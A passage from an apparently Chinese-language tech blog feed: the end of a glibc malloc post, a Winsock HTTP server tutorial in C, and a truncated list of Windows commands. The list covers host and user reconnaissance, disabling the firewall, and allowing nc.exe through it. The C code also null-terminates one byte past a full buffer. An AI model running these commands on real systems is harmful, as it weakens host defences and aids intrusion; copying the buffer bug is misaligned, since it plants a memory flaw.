/proc/PID/maps</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/ScQz515.png"></p><p>可以觀察到Heap區段是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">55590b2c9000-55590b2ea000 rw-p 00000000 00:00 0                          [heap]</span><br><span class="line">7fd7ddf25000-7fd7ddf28000 rw-p 00000000 00:00 0</span><br></pre></td></tr></table></figure><p>當呼叫malloc後，再次查看記憶體分配的情況</p><p><img src="https://i.imgur.com/yy06ND6.png"></p><p><img src="https://i.imgur.com/WpwRXFs.png"></p><p>我們可以發現free完後，所分配到的記憶體並不會馬上釋放，其實會先將記憶體區域釋放給<strong>glibc malloc library</strong>，這邊釋放的記憶體區塊(<strong>Chunk</strong>)會加入到main arenas bin (在glibc malloc中，freelist被稱為bin)，接著如果使用者請求分配新的記憶體區快，malloc就不會去kernel請求新的記憶體區快，而是去bin中找空的區塊(Free chunk)，若bin中沒有可用區塊才會再去跟kernel請求。</p><p><img src="https://i.imgur.com/ixhdaI2.png"></p><p><img src="https://i.imgur.com/43OePVQ.png"></p><div class="note info flat"><p>至於後續的文章會進一步去分析: 使用哪種System Call?</p><ul><li>mmap</li><li>brk</li></ul></div><p><img src="https://i.imgur.com/aLNmaSG.png"></p><h2 id="參考資源"><a href="#參考資源" class="headerlink" title="參考資源"></a>參考資源</h2><p><a href="https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/">https://sploitfun.wordpress.com/2015/02/11/syscalls-used-by-malloc/</a><br><a href="https://hanfeng.ink/post/understand_glibc_malloc/">https://hanfeng.ink/post/understand_glibc_malloc/</a><br><a href="https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/">https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/</a></p>]]></content>
      
      
      <categories>
          
          <category> Deep Dive </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>🧪透過 Winsock 依序堆疊出一個HTTP Server</title>
      <link href="/posts/34f1f1b8.html"/>
      <url>/posts/34f1f1b8.html</url>
      
        <content type="html"><![CDATA[<p><img src="https://i.imgur.com/dcWHOfV.png"></p><p>主要想實做看看在Windows環境下透過Winsocks來建立網路層的Socket並且去進行應用層的協定解析，使用程式語言為C語言，平台則是使用VSCode，本次的學習方式是透過最近很火紅的 <a href="https://chat.openai.com/">ChatGPT</a> 來進行學習，並再自行Debug和研究語法。</p><h2 id="範例程式碼"><a href="#範例程式碼" class="headerlink" title="範例程式碼"></a>範例程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PORT 80 <span class="comment">// HTTP預設使用端口80</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BACKLOG 10 <span class="comment">// 等待連接佇列的最大長度</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 4096 <span class="comment">// 接收緩衝區的大小</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 初始化WinSock庫</span></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line">    <span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;WSAStartup failed: %d\n&quot;</span>, result);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 建立Socket</span></span><br><span class="line">    SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line">    <span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">    serverAddress.sin_family = AF_INET;</span><br><span class="line">    serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    serverAddress.sin_port = htons(PORT);</span><br><span class="line">    result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 監聽Socket</span></span><br><span class="line">    result = listen(listenSocket, BACKLOG);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;listen failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 阻塞等待客戶端的連接</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line">    <span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">    SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line">    <span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br><span class="line">        <span class="comment">// 讀取客戶端發送的請求</span></span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    <span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;recv failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 解析HTTP請求</span></span><br><span class="line">    <span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line">    <span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">    sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 構造HTTP回應</span></span><br><span class="line">    <span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">    sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line">    <span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 發送HTTP回應</span></span><br><span class="line">    result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;send failed: %d\n&quot;</span>, WSAGetLastError());</span><br><span class="line">        closesocket(clientSocket);</span><br><span class="line">        closesocket(listenSocket);</span><br><span class="line">        WSACleanup();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 關閉Socket</span></span><br><span class="line">    closesocket(clientSocket);</span><br><span class="line">    closesocket(listenSocket);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="程式主要流程"><a href="#程式主要流程" class="headerlink" title="程式主要流程"></a>程式主要流程</h2><ol><li>初始化 WinSock 函式庫</li><li>監聽Socket等待client端連接</li><li>接收client請求並解析其Method、URL以及協定版本</li><li>建構HTTP Response，發送給client端</li><li>關閉socket並清理Winsock資源</li></ol><h2 id="程式解釋"><a href="#程式解釋" class="headerlink" title="程式解釋"></a>程式解釋</h2><ul><li>首先一定要引入 &lt;winsock2.h&gt; 標頭檔</li><li>接著載入WinSock DLL  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">WSADATA wsaData;</span><br><span class="line"><span class="type">int</span> result = WSAStartup(MAKEWORD(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData);</span><br><span class="line"><span class="keyword">if</span> (result != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="comment">// 錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>建立socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 建立Socket</span></span><br><span class="line">SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);</span><br><span class="line"><span class="keyword">if</span> (listenSocket == INVALID_SOCKET) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>綁定socket到本地位址與port  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 綁定Socket到本地地址和端口</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serverAddress</span>;</span></span><br><span class="line">serverAddress.sin_family = AF_INET;</span><br><span class="line">serverAddress.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">serverAddress.sin_port = htons(PORT);</span><br><span class="line">result = bind(listenSocket, (SOCKADDR*)&amp;serverAddress, <span class="keyword">sizeof</span>(serverAddress));</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>監聽Socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">result = listen(listenSocket, BACKLOG);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>等待客戶端連接  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Waiting for client to connect...\n&quot;</span>);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">clientAddress</span>;</span></span><br><span class="line"><span class="type">int</span> clientAddressLen = <span class="keyword">sizeof</span>(clientAddress);</span><br><span class="line">SOCKET clientSocket = accept(listenSocket, (SOCKADDR*)&amp;clientAddress, &amp;clientAddressLen);</span><br><span class="line"><span class="keyword">if</span> (clientSocket == INVALID_SOCKET) &#123;</span><br><span class="line">  <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client connected.\n&quot;</span>);</span><br></pre></td></tr></table></figure></li><li>讀取客戶端請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="type">int</span> recvLen = recv(clientSocket, buffer, BUFFER_SIZE, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (recvLen &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">   <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line">buffer[recvLen] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Received request:\n%s&quot;</span>, buffer);</span><br></pre></td></tr></table></figure></li><li>解析HTTP請求  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> method[<span class="number">16</span>];</span><br><span class="line"><span class="type">char</span> url[<span class="number">256</span>];</span><br><span class="line"><span class="type">char</span> version[<span class="number">16</span>];</span><br><span class="line">sscanf_s(buffer, <span class="string">&quot;%s %s %s&quot;</span>, method, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(method), url, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(url), version, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="keyword">sizeof</span>(version));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Parsed request: method=%s, url=%s, version=%s\n&quot;</span>, method, url, version);</span><br></pre></td></tr></table></figure></li><li>建構HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> response[BUFFER_SIZE];</span><br><span class="line">sprintf_s(response, BUFFER_SIZE, <span class="string">&quot;HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\n\r\nHello, World!&quot;</span>);</span><br><span class="line"><span class="type">int</span> responseLen = (<span class="type">int</span>)<span class="built_in">strlen</span>(response);</span><br></pre></td></tr></table></figure></li><li>發送HTTP回覆  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">result = send(clientSocket, response, responseLen, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (result == SOCKET_ERROR) &#123;</span><br><span class="line">    <span class="comment">//錯誤處理</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Sent response:\n%s&quot;</span>, response);</span><br></pre></td></tr></table></figure></li><li>關閉socket  <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">closesocket(clientSocket);</span><br><span class="line">closesocket(listenSocket);</span><br><span class="line">WSACleanup();</span><br></pre></td></tr></table></figure></li></ul><h2 id="程式執行結果"><a href="#程式執行結果" class="headerlink" title="程式執行結果"></a>程式執行結果</h2><ul><li>啟動HTTP Server<br><img src="https://i.imgur.com/J1qd5dQ.png"></li><li>存取 <a href="http://localhost/">http://localhost/</a><br><img src="https://i.imgur.com/wowoin8.png"></li><li>終端顯示結果<br><img src="https://i.imgur.com/ViLckvN.png"></li></ul><h2 id="Winsock2-h-中的函式用法及意義"><a href="#Winsock2-h-中的函式用法及意義" class="headerlink" title="Winsock2.h 中的函式用法及意義"></a>Winsock2.h 中的函式用法及意義</h2><ul><li><strong>WSAStartup</strong><ul><li>用於初始化 Winsock 函式庫，接收資料型別為<strong>WORD</strong>的版本參數以及資料型別為<strong>WSADATA</strong>的struct pointer</li><li>會回傳整數，函式呼叫成功則回傳0，否則回傳error code</li></ul></li><li><strong>socket</strong><ul><li>用於建立新的socket，接收三個參數: 協定家族、socket種類以及協定類型</li><li><pre><code class="c=">SOCKET WSAAPI socket(    [in] int af,    [in] int type,    [in] int protocol);<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    - 他會回傳一個 **SOCKET**</span><br><span class="line">- **bind**</span><br><span class="line">    - 綁定Socket到本地地址和port，接收三個參數:socket 描述子、位址以及位址長度</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI bind(</span><br><span class="line">       [in] SOCKET         s,</span><br><span class="line">       [in] const sockaddr *name,</span><br><span class="line">       [in] int            namelen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>listen</strong><ul><li>用於監聽socket，等待客戶端連接，它接收兩個參數：socket描述子以及和等待連接佇列的最大長度</li><li><pre><code class="c=">int WSAAPI listen(    [in] SOCKET s,    [in] int    backlog  );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">     - 回傳整數</span><br><span class="line">- **accept**</span><br><span class="line">    - 接受客戶端的連接，並回傳一個新的Socket描述子</span><br><span class="line">    - 接收兩個參數: Socket描述子和客戶端地址的pointer</span><br><span class="line">    - ```c=</span><br><span class="line">      SOCKET WSAAPI accept(</span><br><span class="line">         [in]      SOCKET   s,</span><br><span class="line">         [out]     sockaddr *addr,</span><br><span class="line">         [in, out] int      *addrlen</span><br><span class="line">      );</span><br></pre></td></tr></table></figure></code></pre></li><li>會回傳一個 <strong>SOCKET</strong> 型別的值，以表示新的Socket描述子</li></ul></li><li><strong>recv</strong><ul><li>接收客戶端發送的資料</li><li>接收四個參數: Socket描述子、接收緩衝區的pointer、緩衝區的大小和接收選項</li><li><pre><code class="c=">int WSAAPI recv(   [in]  SOCKET s,   [out] char   *buf,   [in]  int    len,   [in]  int    flags );<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **send**</span><br><span class="line">    -  發送資料到客戶端</span><br><span class="line">    -  他接受四個參數: Socket描述子、發送緩衝區的pointer、緩衝區的大小和發送選項</span><br><span class="line">    -  ```c=</span><br><span class="line">       int WSAAPI send(</span><br><span class="line">         [in] SOCKET     s,</span><br><span class="line">         [in] const char *buf,</span><br><span class="line">         [in] int        len,</span><br><span class="line">         [in] int        flags</span><br><span class="line">        );</span><br></pre></td></tr></table></figure></code></pre></li><li>回傳整數</li></ul></li><li><strong>closesocket</strong><ul><li>關閉Socket</li><li>接收一個socket 描述子作為參數</li><li><pre><code class="c=">int WSAAPI closesocket(    [in] SOCKET s);  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    - 回傳整數</span><br><span class="line">- **WSACleanup**</span><br><span class="line">    - 清理WinSock函式庫的資源，不接收任何參數，並回傳整數</span><br><span class="line">    - ```c=</span><br><span class="line">      int WSAAPI WSACleanup();</span><br></pre></td></tr></table></figure></code></pre></li></ul></li></ul><p>上述函式中任何回傳整數的函式，若回傳值為0，則為函式呼叫成功，否則為Error code</p>]]></content>
      
      
      <categories>
          
          <category> 學習筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 網路程式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>💻 Windows 常見指令</title>
      <link href="/posts/5b6eeeb3.html"/>
      <url>/posts/5b6eeeb3.html</url>
      
        <content type="html"><![CDATA[<h2 id="蒐集本機資訊"><a href="#蒐集本機資訊" class="headerlink" title="蒐集本機資訊"></a>蒐集本機資訊</h2><ul><li>網路設定資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/all</span><br></pre></td></tr></table></figure></li><li>作業系統以及版本資訊<ul><li>中文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;作業系統名稱&quot; /C:&quot;作業系統版本&quot;</span><br></pre></td></tr></table></figure></li><li>英文版  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li>系統結構<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo %PROCESSOR_ARCHITECTURE%</span><br></pre></td></tr></table></figure></li><li>查看安裝的軟體版本<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</span><br></pre></td></tr></table></figure></li><li>查詢本機服務<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic service list brief</span><br></pre></td></tr></table></figure></li><li>查詢處理程序列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tasklist</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic process list brief</span><br></pre></td></tr></table></figure></li><li>查看啟動程式<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic startup get command,caption</span><br></pre></td></tr></table></figure></li><li>查看任務計畫<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">schtasks /query /fo LIST /v</span><br></pre></td></tr></table></figure></li><li>查看主機開機時間<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net statistics workstation</span><br></pre></td></tr></table></figure></li><li>查看使用者列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net user</span><br></pre></td></tr></table></figure></li><li>獲取本機管理員資訊<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net localgroup administrators</span><br></pre></td></tr></table></figure></li><li>查看當前線上使用者<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">query user || qwinsta</span><br></pre></td></tr></table></figure></li><li>列出本機電腦以及所連接的用戶端之間的Session<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net session //通常需要admin 權限才能執行</span><br></pre></td></tr></table></figure></li><li>查詢通訊埠列表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -ano</span><br></pre></td></tr></table></figure></li><li>查路由表以及可用的ARP Cache表<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route print</span><br><span class="line">arp -a</span><br></pre></td></tr></table></figure></li><li>關閉防火牆<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall set opmode disable</span><br></pre></td></tr></table></figure></li><li>Windows Server 2003之後的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall set allprofiles state off</span><br></pre></td></tr></table></figure></li></ul></li><li>查看防火牆設定<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall show config</span><br></pre></td></tr></table></figure></li><li>修改防火牆設定<ul><li>Windows Server 2003及以前的版本  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh firewall add allowedprogram C:\nc.exe 